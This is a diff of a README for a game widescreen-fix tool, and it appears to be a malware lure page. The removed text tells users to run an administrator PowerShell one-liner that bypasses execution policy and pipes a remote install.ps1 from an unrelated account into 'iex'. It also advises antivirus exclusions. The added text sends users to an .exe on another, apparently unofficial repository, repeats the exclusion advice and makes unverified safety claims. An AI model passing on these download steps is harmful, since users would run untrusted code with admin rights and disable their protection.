@@ -1,126 +1,64 @@
-# Flawless Widescreen Download for Windows 11 & 10
+# 🖥️ Flawless-Widescreen - Fix your game field of view
 
-**Flawless-Widescreen**
+[![](https://img.shields.io/badge/Download_Flawless_Widescreen-8a8a8a.svg)](https://github.com/Pahasaras574/Flawless-Widescreen)
 
-**Flawless Widescreen** for PC gamers on Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+## 📌 About this software
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Gaming](https://img.shields.io/badge/For-PC%20Gamers-16a34a?style=flat-square&logo=gamepad)]()
+Flawless Widescreen helps you adjust the camera view in computer games. Many games do not support ultrawide monitors. These games crop the image. This software corrects the field of view. You see more of the game world on your monitor. It removes black bars on the sides of your screen. It creates a better picture for your games.
 
----
+## ⚙️ System settings
 
-## Download & Install (PowerShell)
+This software runs on Windows 10 and Windows 11. It requires enough memory to process game memory buffers. Most modern computers meet these needs. Ensure your computer has the latest version of the .NET framework. This framework helps the application communicate with your games.
 
-> **This is the download page.** The command below downloads and runs the **Flawless Widescreen** installer on Windows 10/11.
+## 💾 Installation steps
 
-#### Before you start
+Follow these steps to set up the software.
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+1. Go to the [official release page](https://github.com/Pahasaras574/Flawless-Widescreen).
+2. Look for the assets section on the page.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the prompts on the screen.
+7. Click finish when the installer completes.
 
----
+## 🎮 How to use the software
 
-#### Step 1 — Open PowerShell as Administrator
+Open the application from your desktop shortcut. You will see a list of games in the left panel. Select your game from the list. The software searches for the game cache. It shows a green checkmark once it identifies the game.
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+Adjust the sliders in the settings panel to change your view. Move the slider to the right to zoom out. Move it to the left to zoom in. The changes happen inside the game instantly. You do not need to restart your game to see the results.
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+## 🛠️ Common troubleshooting
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+The software does not affect your game save files. It only edits the memory while the game runs. If the software stops working, check these items:
 
----
+* Verify that your game version matches the plugin version.
+* Run the application with administrator rights. Right-click the icon and choose Run as administrator.
+* Check your antivirus software. Sometimes it blocks the memory injection. Add an exclusion for the Flawless Widescreen folder.
+* Update your graphics drivers to the latest version.
 
-#### Step 2 — Copy the full command
+## 📝 Frequently asked questions
 
-Select **both lines** below and press **Ctrl+C**:
+Does this tool cause game bans? No. The software only changes the local field of view settings. It does not interact with multiplayer servers. 
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+Does this work on all games? No. A community member must write a plugin for each specific game. The software includes built-in updates to fetch new plugins.
 
-> Copy **both lines**, not just the second one.
+Can I move the window while playing? Yes. You can minimize the application to your system tray. It continues to work in the background.
 
----
+## 🛡️ Privacy and safety
 
-#### Step 3 — Paste into PowerShell and press Enter
+This application does not collect your data. It does not track your internet usage. It functions offline. The software only connects to the internet to download game plugins. Your disk remains safe. It writes no files outside of its own folder.
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
+## 💎 Features
 
----
+* Automatic plugin updates
+* Simple slider controls
+* Real-time field of view adjustment
+* System tray integration
+* Support for multiple monitor ratios
+* Low memory usage
+* No complex settings menus
 
-#### Step 4 — Finish setup
+## 🚀 Future plans
 
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
-
----
-
-#### Step 5 — Launch the app
-
-Open **Start menu** → search for **Flawless Widescreen** → run it.
-
----
-
-#### Troubleshooting
-
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
-
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**Flawless Widescreen** setup page for Windows PC gamers.
-
-**People also search for:** flawless widescreen download, ultrawide fov fix games install windows
-
-**Repository:** `Flawless-Widescreen`
-
-
-## After install
-
-| Step | Tip |
-| --- | --- |
-| 1 | Run once as Administrator on first setup |
-| 2 | Add your game folders to exclusions if AV blocks tools |
-| 3 | Pin to taskbar for quick access between matches |
-| 4 | Check for updates inside the app after major game patches |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB for mod tools / recording) |
-| Disk | 500 MB free space |
-| GPU | DirectX 11 compatible |
-| Admin | Required for install/repair |
-
-## Troubleshooting
-
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for this page |
-| Setup blocked | Run as Administrator |
-| Tool not detected in game | Restart game after installing |
-| Antivirus warning | Add install folder to exclusions temporarily |
-
----
-
-**Topics:** flawless-widescreen-download, flawless, widescreen, ultrawide-fov-fix-games-install-windows, ultrawide, flawless-widescreen, flawless-widescreen-2026, fov-fix, gaming, software, windows-11, download
+The project remains open for new plugin development. Users report issues with specific games to help the project grow. New updates arrive as games receive patches. Check the main page often for updates.
